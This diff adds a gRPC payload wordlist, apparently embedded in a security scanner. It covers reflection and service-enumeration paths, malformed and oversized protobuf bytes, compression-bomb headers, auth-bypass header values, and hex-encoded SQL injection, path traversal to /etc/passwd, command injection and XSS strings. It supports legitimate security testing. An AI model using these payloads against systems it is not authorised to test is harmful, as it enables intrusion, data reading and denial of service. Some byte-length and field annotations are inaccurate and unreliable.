@@ -1,0 +1,391 @@
+# gRPC payload wordlist
+# Embedded in Warden binary
+
+# === gRPC Reflection Requests ===
+
+# Server reflection v1 - ListServices
+.*  # List all services
+grpc.reflection.v1.ServerReflection  # Reflection service itself
+grpc.health.v1.Health  # Health check service
+
+# Server reflection - FileDescriptor
+google.protobuf.Empty  # Empty type descriptor
+grpc.reflection.v1.ServerReflectionRequest  # Request type
+grpc.reflection.v1.ServerReflectionResponse  # Response type
+
+# ListServices request patterns
+list_services_by_host
+list_services
+file_descriptor
+file_containing_symbol
+file_containing_extension
+all_extension_numbers_of_type
+list_extension_numbers
+
+# === Reflection Service Discovery ===
+
+# Common reflection service paths
+/grpc.reflection.v1.ServerReflection/ServerReflectionInfo
+/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo
+/reflection/service
+/grpc.reflection.ServerReflection/ServerReflectionInfo
+/reflection/v1alpha/reflection
+
+# Common service names to enumerate
+grpc.health.v1.Health
+grpc.reflection.v1.ServerReflection
+grpc.channelz.v1.Channelz
+grpc.dev.dev.v1.ReflectionService
+grpc.testing.TestService
+grpc.examples.echo.Echo
+grpc.lb.v1.LoadBalancer
+
+# Health check paths
+/grpc.health.v1.Health/Check
+/grpc.health.v1.Health/Watch
+/health/Check
+/health/Watch
+
+# === Malformed Protobuf Messages ===
+
+# Invalid varint sequences
+FFFFFFFFFF  # Invalid varint (too large)
+FF          # Truncated varint
+80          # Varint without continuation bytes
+
+# Invalid wire types
+07          # Invalid wire type (7)
+0F          # Invalid wire type with field number
+
+# Length delimiter issues
+0A FF       # Length field larger than message
+0A 00       # Empty length-delimited field
+
+# Wrong type for field number
+08 41       # Int64 field with string data
+0D 41       # Invalid wire type
+
+# Type confusion payloads
+08 00 00 00 00  # Very large varint
+09 00 00 00 00  # Wrong wire type
+0A 01 41        # String as int64
+0A 04 74657374  # Test string in wrong field
+
+# Truncated messages
+00           # Just compressed flag
+00 00        # Compressed flag + empty length
+00 00 00 00 00 00  # Compressed flag + length but no payload
+
+# Invalid field numbers
+F8 01        # Field 15 (invalid)
+80 01        # Field 1 with continuation bit in wrong place
+
+# Zig-zag encoding issues
+FF FF        # Negative zero in zigzag
+FE FF FF FF  # Max negative int
+
+# === Integer Overflow Payloads ===
+
+# Max int64 values
+08 FF FF FF FF FF FF FF FF 7F  # Max int64
+08 80 80 80 80 80 80 80 80 80 01  # Even larger varint
+
+# Min int64 values
+08 FF FF FF FF FF FF FF FF FF 01  # Min int64 (in zigzag)
+
+# Large repeated counts
+0A 80 01 41  # String with length 129 (overflow potential)
+0A FF FF FF FF  # String with huge length
+
+# Field number overflow
+F8 FF FF FF  # Field number > max
+
+# === Type Confusion Payloads ===
+
+# Send string as int64
+08 0A        # Field 1, wire type 0, value 10
+0A 0A 31 32 33 34 35 36 37 38 39 30  # Field 1, string "1234567890"
+
+# Send bytes as message
+0A 01 00     # Single byte message
+0A 02 41 42  # Two bytes "AB"
+
+# Send nested messages
+0A 03 0A 01 41  # Nested message with single field
+0A 06 0A 04 0A 02 41 42  # Doubly nested
+
+# Enum value overflow
+08 FF FF    # Very large enum value
+08 80 01    # Enum value 128 (potentially out of range)
+
+# === Compression Abuse (DoS) ===
+
+# Gzip compression bomb headers
+1F 8B 08 00  # Gzip magic number
+1F 8B 08 00 00 00 00 00  # Full gzip header
+
+# High compression ratio patterns
+00 00 00 00 01 00  # Compressed flag + small payload
+00 00 00 00 10 00  # 4KB all zeros
+
+# Repeated compression markers
+01 00 00 00 01 78 9C  # Compressed with zlib header
+01 00 00 00 01 1F 8B  # Compressed with gzip header
+
+# === Large Message Payloads ===
+
+# Message size tests
+00 00 00 00 40 00 00 00  # 1MB length
+00 00 00 10 00 00 00 00  # 256MB length
+00 00 00 01 00 00 00 00  # 16MB length
+
+# Large repeated fields
+0A 01 41 0A 01 41 0A 01 41  # Many string fields
+08 00 08 01 08 02 08 03  # Many int64 fields
+
+# Large nested messages
+0A 81 01 41  # 129-byte string
+0A 82 01 41 41  # 130-byte string
+
+# Repeated field abuse
+10 00 10 01 10 02 10 03 10 04 10 05  # Field 2 repeated
+18 00 18 00 18 00 18 00 18 00 18 00  # Field 3 repeated
+
+# === Header Manipulation ===
+
+# Authorization bypass headers
+authorization: null
+authorization: Bearer null
+authorization: Bearer
+authorization:
+grpc-authorization: null
+x-api-key: null
+
+# Empty header values
+authorization:
+grpc-accept-encoding:
+grpc-timeout:
+
+# Invalid header values
+grpc-accept-encoding: invalid
+grpc-timeout: -1
+grpc-timeout: 999999999S
+
+# === Common Service Test Calls ===
+
+# Empty calls to common services
+google.protobuf.Empty
+grpc.health.v1.Health/Check
+grpc.health.v1.Health/Watch
+grpc.reflection.v1.ServerReflection/ServerReflectionInfo
+
+# Admin service patterns
+AdminService/GetUsers
+AdminService/DeleteUser
+AdminService/UpdateUser
+AdminService/CreateUser
+
+# Auth service patterns
+AuthService/Login
+AuthService/Logout
+AuthService/RefreshToken
+AuthService/ValidateToken
+AuthService/ResetPassword
+
+# User service patterns
+UserService/GetUser
+UserService/ListUsers
+UserService/CreateUser
+UserService/UpdateUser
+UserService/DeleteUser
+
+# Data service patterns
+DataService/Query
+DataService/Insert
+DataService/Update
+DataService/Delete
+
+# === Metadata Tests ===
+
+# Null metadata
+grpc-metadata-user: null
+grpc-metadata-password: null
+
+# Empty metadata
+grpc-metadata-token:
+
+# Special characters in metadata
+grpc-metadata-test: \x00\x01\x02
+grpc-header: \n\r\t
+
+# Unicode metadata
+grpc-metadata-unicode: \xc3\xa9\xc3\xa0
+grpc-header-emoji: \xf0\x9f\x98\x80
+
+# === Stream Abuse Patterns ===
+
+# Server streaming test calls
+StreamService/ServerStream
+StreamService/BidirectionalStream
+TestService/StreamingOutput
+
+# Large stream request
+0A 01 41 0A 01 42 0A 01 43  # Multiple messages
+
+# Repeated stream opens
+ListStream
+SubscribeStream
+WatchStream
+
+# === File Descriptor Requests ===
+
+# Descriptor by symbol name
+symbol: google.protobuf.Empty
+symbol: grpc.health.v1.Health.Check
+symbol: .
+
+# All extension numbers
+extension_number: google.protobuf.Empty
+extension_type: google.protobuf.MessageOptions
+
+# === Common Attack Patterns ===
+
+# SQL injection in string fields
+0A 0B 27 20 4F 52 20 27 31 27 3D 27 31  # ' OR '1'='1
+0A 0B 31 27 20 55 4E 49 4F 4E 20 53 45 4C 45 43 54  # 1' UNION SELECT
+
+# Path traversal
+0A 10 2E 2E 2F 2E 2E 2F 2E 2E 2F 65 74 63 2F 70 61 73 73 77 64  # ../../../etc/passwd
+0A 05 2E 2E 5C 2E 2E  # ..\..
+
+# Command injection
+0A 0B 3B 20 6C 73 20 2F 3B 20  # ; ls /;
+0A 0B 7C 20 63 61 74 20 2F 65 74 63 2F 70 61 73 73 77 64  # | cat /etc/passwd
+
+# XSS in string fields
+0A 1C 3C 73 63 72 69 70 74 3E 61 6C 65 72 74 28 31 29 3C 2F 73 63 72 69 70 74 3E  # <script>alert(1)</script>
+
+# === DoS via Nested Messages ===
+
+# Deep nesting
+0A 08 0A 06 0A 04 0A 02 41 42  # Nested 4 deep
+0A 10 0A 0E 0A 0C 0A 0A 0A 08 0A 06 0A 04 0A 02 41 42  # Nested 6 deep
+
+# Circular reference pattern
+0A 04 08 01 0A 04 08 02 0A 04 08 01  # Circular back-reference
+
+# Wide branching
+08 01 08 02 08 03 08 04 08 05 08 06 08 07 08 08 08 09  # Many sibling fields
+0A 01 41 0A 01 42 0A 01 43 0A 01 44 0A 01 45  # Many string siblings
+
+# === Protobuf Fuzzing Vectors ===
+
+# Random bytes for fuzzing
+DE AD BE EF
+CA FE BA BE
+FE ED FA CE
+BA AD F0 0D
+
+# Bit flip patterns
+FF FF FF FF
+AA AA AA AA
+55 55 55 55
+00 FF 00 FF
+
+# Boundary values
+00 00 00 00  # Zero
+FF FF FF FF  # All ones
+7F FF FF FF  # Max positive
+80 00 00 00  # Min negative
+
+# === Invalid UTF-8 in Strings ===
+
+# Invalid UTF-8 sequences
+0A 02 80  # Invalid continuation byte
+0A 02 C0  # Overlong encoding
+0A 02 F5  # Invalid Unicode
+
+# Incomplete sequences
+0A 03 C2  # Truncated 2-byte sequence
+0A 04 E0 80  # Truncated 3-byte sequence
+
+# === Test Service Methods ===
+
+# Echo service
+Echo/Echo
+Echo/EchoBytes
+
+# Test service
+TestService/EmptyCall
+TestService/UnaryCall
+TestService/StreamingOutputCall
+TestService/StreamingInputCall
+TestService/FullDuplexCall
+
+# Benchmark service
+BenchmarkService/UnaryCall
+BenchmarkService/StreamingCall
+
+# === Database Service Patterns ===
+
+# CRUD operations
+DatabaseService/Create
+DatabaseService/Read
+DatabaseService/Update
+DatabaseService/Delete
+DatabaseService/List
+
+# Transaction patterns
+TransactionService/Begin
+TransactionService/Commit
+TransactionService/Rollback
+
+# Query patterns
+QueryService/Execute
+QueryService/Query
+QueryService/BatchQuery
+
+# === Authentication Service Patterns ===
+
+# Token operations
+TokenService/GenerateToken
+TokenService/ValidateToken
+TokenService/RefreshToken
+TokenService/RevokeToken
+
+# Session operations
+SessionService/CreateSession
+SessionService/GetSession
+SessionService/DeleteSession
+
+# === File Service Patterns ===
+
+# File operations
+FileService/Upload
+FileService/Download
+FileService/Delete
+FileService/ListFiles
+
+# Directory operations
+FileService/CreateDirectory
+FileService/DeleteDirectory
+
+# === Configuration Service Patterns ===
+
+ConfigService/GetConfig
+ConfigService/SetConfig
+ConfigService/DeleteConfig
+ConfigService/WatchConfig
+
+# === Logging Service Patterns ===
+
+LoggingService/Log
+LoggingService/GetLogs
+LoggingService/StreamLogs
+
+# === Metrics Service Patterns ===
+
+MetricsService/GetMetrics
+MetricsService/GetCounter
+MetricsService/GetGauge
+MetricsService/GetHistogram
